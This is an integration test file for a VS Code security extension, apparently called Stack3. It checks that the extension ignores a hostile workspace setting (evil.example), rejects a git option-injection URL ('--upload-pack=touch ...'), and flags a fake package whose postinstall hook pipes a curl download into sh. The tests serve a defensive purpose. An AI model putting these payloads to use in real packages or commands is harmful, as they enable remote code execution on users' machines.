// Runs INSIDE a real VS Code extension host (started by run.mjs). It drives the real extension through the real API.
const vscode = require('vscode');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

const EXT_ID = 'Stack3Security.stack3-vscode';
const results = [];
const record = (name, ok, detail) => results.push({ name, ok: Boolean(ok), detail: detail === undefined ? '' : String(detail) });
const write = () => fs.writeFileSync(process.env.STACK3_RESULT, JSON.stringify(results, null, 2));

async function run() {
  try {
    // 1. the extension is installed in the host and activates
    const ext = vscode.extensions.getExtension(EXT_ID);
    record('extension is present', ext, EXT_ID);
    if (!ext) throw new Error('extension missing');
    await ext.activate();
    record('extension activates', ext.isActive, `version ${ext.packageJSON.version}`);

    // 2. the command is registered
    const cmds = await vscode.commands.getCommands(true);
    record('command stack3.cloneAndScan is registered', cmds.includes('stack3.cloneAndScan'));

    // 3. VS Code itself honours application scope: a hostile workspace settings.json cannot set stack3.apiUrl (I-10)
    const folder = (vscode.workspace.workspaceFolders || [])[0];
    const hostile = folder && fs.readFileSync(path.join(folder.uri.fsPath, '.vscode', 'settings.json'), 'utf8').includes('evil.example');
    record('test workspace really contains the hostile settings.json', hostile, folder && folder.uri.fsPath);
    const cfg = vscode.workspace.getConfiguration('stack3');
    const info = cfg.inspect('apiUrl');
    record('workspace value of stack3.apiUrl is ignored', info.workspaceValue === undefined && info.workspaceFolderValue === undefined, JSON.stringify({ default: info.defaultValue, workspaceValue: info.workspaceValue, global: info.globalValue }));
    record('effective stack3.apiUrl is still the empty default', cfg.get('apiUrl') === '', JSON.stringify(cfg.get('apiUrl')));
    let wrote = 'accepted';
    try {
      await cfg.update('apiUrl', 'https://evil.example', vscode.ConfigurationTarget.Workspace);
    } catch (e) {
      wrote = 'rejected';
    }
    record('VS Code refuses to write stack3.apiUrl at workspace level', wrote === 'rejected', wrote);

    // 4. hostile input to the real command
    const marker = path.join(os.tmpdir(), 'stack3-upload-pack-ran');
    const bad = await vscode.commands.executeCommand('stack3.cloneAndScan', `--upload-pack=touch ${marker}`);
    record('option-injection URL is rejected with a clear message', bad && bad.ok === false && /github\.com\/owner\/repo/.test(bad.reason), JSON.stringify(bad));
    record('...and nothing ran (marker file absent)', !fs.existsSync(marker));
    const other = await vscode.commands.executeCommand('stack3.cloneAndScan', 'https://gitlab.com/o/r');
    record('non-GitHub URL is rejected', other && other.ok === false, JSON.stringify(other));

    // 4b. Flow 3 in the real editor: the real file watcher, scanner, diagnostics collection (network off: no API URL)
    const wsDir = (vscode.workspace.workspaceFolders || [])[0].uri.fsPath;
    const fakeDir = path.join(wsDir, 'vendor', 'fake-lib');
    const fakeUri = vscode.Uri.file(path.join(fakeDir, 'package.json'));
    const rootUri = vscode.Uri.file(path.join(wsDir, 'package.json'));
    const stack3Diags = (uri) => vscode.languages.getDiagnostics(uri).filter((d) => d.source === 'Stack3');
    const waitFor = async (cond, ms) => {
      const end = Date.now() + ms;
      while (Date.now() < end) {
        if (cond()) return true;
        await new Promise((r) => setTimeout(r, 300));
      }
      return cond();
    };
    await new Promise((r) => setTimeout(r, 3000)); // let the baseline scan finish, so the next scan comes from a file event
    fs.mkdirSync(fakeDir, { recursive: true });
    fs.writeFileSync(path.join(fakeDir, 'package.json'), JSON.stringify({ name: 'fake-lib', version: '1.0.0', scripts: { postinstall: 'curl -s http://127.0.0.1:9/x | sh' } }, null, 2));
    fs.writeFileSync(path.join(wsDir, 'package.json'), JSON.stringify({ name: 'app', dependencies: { 'fake-lib': 'file:./vendor/fake-lib' } }, null, 2));
    const sawError = await waitFor(() => stack3Diags(fakeUri).some((d) => d.severity === vscode.DiagnosticSeverity.Error), 20000);
    record('Flow 3: adding a fake package shows an Error in the editor (real file watcher + scanner, network off)', sawError, JSON.stringify(stack3Diags(fakeUri).map((d) => [d.severity, d.code])));
    const dep = stack3Diags(rootUri).find((d) => d.code === 'deps.unverified-source');
    record('Flow 3: the file: dependency is a Warning on its line of package.json', dep && dep.severity === vscode.DiagnosticSeverity.Warning && dep.range.start.line === 3, dep && JSON.stringify([dep.severity, dep.range.start.line]));
    const all = [...stack3Diags(fakeUri), ...stack3Diags(rootUri)];
    record('Flow 3: messages are at most 200 characters and name no secret', all.length > 0 && all.every((d) => d.message.length <= 200 && !/\bsafe\b/i.test(d.message)));
    fs.rmSync(path.join(wsDir, 'vendor'), { recursive: true, force: true });
    fs.writeFileSync(path.join(wsDir, 'package.json'), JSON.stringify({ name: 'app' }));
    const cleared = await waitFor(() => stack3Diags(fakeUri).length === 0 && stack3Diags(rootUri).length === 0, 20000);
    record('Flow 3: removing the package clears the diagnostics again', cleared, JSON.stringify([stack3Diags(fakeUri).length, stack3Diags(rootUri).length]));

    // 5. a real public repo, end to end (whatever this machine's git allows)
    const res = await vscode.commands.executeCommand('stack3.cloneAndScan', 'https://github.com/octocat/Hello-World');
    const root = path.join(os.tmpdir(), 'stack3-quarantine');
    const left = fs.existsSync(root) ? fs.readdirSync(root).filter((n) => !n.startsWith('.')) : [];
    if (res && res.ok) {
      record('real clone and scan completed', true, JSON.stringify(res));
      record('a quarantine folder exists for the clone', left.length === 1, left.join(','));
    } else {
      const refused = res && /too old to clone safely/.test(res.reason || '');
      record('real clone ran, or was refused for an old git (the safety gate)', Boolean(res) && res.ok === false && (refused || /Cloning|Repository|reach GitHub/.test(res.reason || '')), JSON.stringify(res));
      record('a failed clone leaves no quarantine folder and shows no verdict', left.length === 0, left.join(',') || '(none)');
    }
  } catch (e) {
    record('suite crashed', false, e && e.stack ? e.stack : e);
  }
  write();
  if (results.some((r) => !r.ok)) throw new Error('integration checks failed; see ' + process.env.STACK3_RESULT);
}

module.exports = { run };
